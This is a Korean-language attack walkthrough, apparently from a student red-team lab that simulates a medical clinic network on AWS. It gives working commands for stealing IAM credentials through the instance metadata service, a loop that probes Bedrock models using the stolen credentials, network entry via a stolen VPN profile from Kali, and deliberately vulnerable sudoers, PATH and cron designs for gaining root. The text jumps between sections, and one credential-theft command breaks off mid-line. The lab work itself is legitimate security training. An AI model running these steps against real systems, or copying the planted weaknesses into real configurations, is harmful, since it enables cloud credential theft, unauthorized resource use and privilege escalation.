2. 1단계 — IMDSv2 토큰 발급 및 IAM 자격증명 탈취​

실행 위치: Web EC2

Bastion 경유 접속 (테스트용): ssh -i med-clinic-key.pem -o ProxyJump=ubuntu@3.34.223.22 ubuntu@10.0.3.6

Step 1 — IMDSv2 토큰 발급​

TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo $TOKEN

실제 결과:

AQAEAMYQLaNRptrSp9ctTOK-5HxuPDuxHvxEE0iiE0DZWYzY3LCSfg==

포인트: IMDSv2는 PUT 요청 + X-aws-ec2-metadata-token-ttl-seconds 헤더 없이는 토큰 발급 불가. 단순 GET SSRF로는 이 단계를 통과할 수 없음 → 헤더 조작 가능한 SSRF 필요.

Step 2 — IAM Role 이름 조회​

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

실제 결과:

med-clinic-web-role

Step 3 — IAM 임시 자격증명 탈취​

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \

3-3. Bedrock 무단 AI 모델 호출​

List 계열 권한(bedrock:ListFoundationModels, bedrock:ListInferenceProfiles)은 없으므로 알려진 모델 ID를 순서대로 직접 호출하여 사용 가능한 모델을 탐색합니다.

for MODEL in \
  "anthropic.claude-3-5-haiku-20241022-v1:0" \
  "anthropic.claude-3-5-sonnet-20241022-v2:0" \
  "anthropic.claude-3-haiku-20240307-v1:0" \
  "anthropic.claude-3-sonnet-20240229-v1:0" \
  "anthropic.claude-instant-v1"; do
  echo -n "Testing $MODEL ... "
  RESULT=$(aws bedrock-runtime invoke-model \
    --region ap-northeast-2 \
    --model-id "$MODEL" \
    --body '{"anthropic_version":"bedrock-2023-05-31","max_tokens":10,"messages":[{"role":"user","content":"hi"}]}' \
    --cli-binary-format raw-in-base64-out \
    /tmp/bedrock-test.json 2>&1)
  if echo "$RESULT" | grep -q "AccessDeniedException"; then
    echo "DENIED"
  elif echo "$RESULT" | grep -q "ValidationException"; then
    echo "NOT AVAILABLE"
  else
    echo "SUCCESS"
    cat /tmp/bedrock-test.json
    break
  fi
done

7. 6단계 — 탈취한 ovpn으로 Kali에서 내부망 직접 접속​

실행 위치: Kali (새 터미널)

배경​

탈취한 gw-vm.ovpn에는 GW VM의 클라이언트 인증서와 개인키가 포함되어 있습니다. 이 파일로 Kali가 직접 Bastion VPN 서버에 접속하면 내부망(192.168.10.0/24)에 직접 연결됩니다.

⚠️ gw-vm.ovpn의 remote 포트가 1194로 되어 있으나, Bastion은 SSLH로 TCP 22에서 멀티플렉싱 중. 포트를 22로 수정해야 접속 가능.

Step 1 — gw-vm.ovpn 저장 및 포트 수정​

sudo nano ~/Desktop/rookies/gw-vm.ovpn
# 앞서 cat으로 출력한 gw-vm.ovpn 전체 내용 붙여넣기 후 저장

# remote 포트 수정: 1194 → 22
# 변경 전: remote 3.34.223.22 1194
# 변경 후: remote 3.34.223.22 22

Step 2 — OpenVPN 접속​

sudo openvpn --config ~/Desktop/rookies/gw-vm.ovpn

⚠️ 동시 접속 충돌: 동일한 클라이언트 인증서(gw-vm)로 Kali와 GW VM이 동시에 접속하면 Bastion 서버가 기존 연결을 끊어버림. → 7단계에서 Kali 전용 인증서 발급으로 해결.

8-3. root 권한 상승 (🔄 방법 확정 후 진행 예정)​

아래 3가지 방법을 후보로 검토 중이며, 팀원 및 멘토님 의견 수렴 후 확정 예정입니다.

방법 1 — PATH 환경변수 취약점 (sudo 스크립트 악용)

사전 설계: 절대경로 없이 명령어를 호출하는 sudo 실행 스크립트 배치, emr_admin sudo 권한 부여.

sudo 실행 스크립트 내부에서 절대경로 없이 명령어 호출
→ 공격자가 PATH 앞에 악성 바이너리 삽입
→ sudo 실행 시 악성 바이너리가 root로 실행됨 → root 셸 획득

장점: 실제 현장에서 발생하는 취약점 패턴, 기술적 설명 풍부. 단점: 취약한 스크립트 사전 배치 필요.

방법 2 — nano GTFOBins (편집기 sudo 권한 악용)

사전 설계: emr_admin에게 특정 설정 파일 편집용 sudo nano 권한 부여.

# sudoers 설정 (의도적 취약 설계)
emr_admin ALL=(ALL) NOPASSWD: /usr/bin/nano /etc/hosts

설정 근거: EMR 운영팀이 설정 파일을 수동 편집하는 상황에서, 관리자가 편의상 sudo nano 권한 부여. 특정 파일만 제한했지만 편집기 내부에서 셸을 띄우는 것을 막지 못한 실수.

sudo nano /etc/hosts → 편집기 내부에서 셸 실행 (GTFOBins) → root 셸 획득

장점: 시연 임팩트 명확, "최소 권한 원칙을 지키려 했지만 편집기 기능을 간과" 설명 가능. 단점: sudoers 설정 근거 사전 준비 필요.

방법 3 — crontab 악용 (root 실행 스크립트 덮어쓰기)

사전 설계: root crontab에 주기적으로 실행되는 백업 스크립트 등록, 해당 스크립트 파일을 emr_admin이 쓰기 가능한 경로에 배치.

root crontab에 1분 간격으로 백업 스크립트 등록
→ 스크립트 파일이 emr_admin 쓰기 가능 경로에 위치
→ 공격자가 스크립트 내용을 악성 코드로 덮어씀
→ cron 실행 시 root 권한으로 악성 코드 실행 → root 셸 획득

장점: sudo 직접 실행 불필요, 지속성(Persistence) 관점 설명 가능, 실제 침해사고 패턴. 단점: cron 주기 대기 시간 발생 가능.

부록 A — 트러블슈팅​

A-1. Kali ↔ GW-VM VPN 동시 접속 충돌​

문제: 동일한 gw-vm 클라이언트 인증서로 Kali와 GW-VM이 동시 접속 시 기존 연결 강제 종료
해결: Bastion Easy-RSA로 kali-attacker 전용 클라이언트 인증서 발급 후 별도 ovpn 파일 생성 (7-1, 7-2 참조)

A-2. kali-attacker.ovpn 인증서 미교체 문제​

문제: ovpn 조합 스크립트에서 inline 파일 사용 시 CN=gw-vm 인증서가 그대로 삽입됨
해결: pki/issued/kali-attacker.crt, pki/private/kali-attacker.key, server/tc.key를 직접 참조하여 ovpn 재생성

⚠️ tls 키 파일명이 ta.key가 아닌 tc.key임에 주의

A-3. Kali에서 내부망(192.168.10.0/24) 직접 접근 불가​

문제: Kali → 192.168.10.x ping 100% packet loss
원인 및 해결:

서버설정 내용
Bastionsysctl -w net.ipv4.conf.all.send_redirects=0 — ICMP 리다이렉트 비활성화
Bastioniptables POSTROUTING에서 192.168.10.0/24 목적지를 SNAT 대상에서 제외
GW-Serveriptables -t nat -A POSTROUTING -s 10.8.0.0/24 -d 192.168.10.0/24 -j MASQUERADE — Kali 발신 패킷을 GW-Server IP로 SNAT

결론: Kali에서 직접 내부망 접근 시 리턴 경로 문제로 불가. GW-Server를 경유하는 방식으로 우회.

A-4. Samba smb_admin 계정 미등록​

문제: smbclient 접속 시 NT_STATUS_ACCESS_DENIED
해결: SVC-Server에서 sudo smbpasswd -a smb_admin으로 Samba 계정 등록 필요

pdbedit -L로 등록 여부 사전 확인 권장
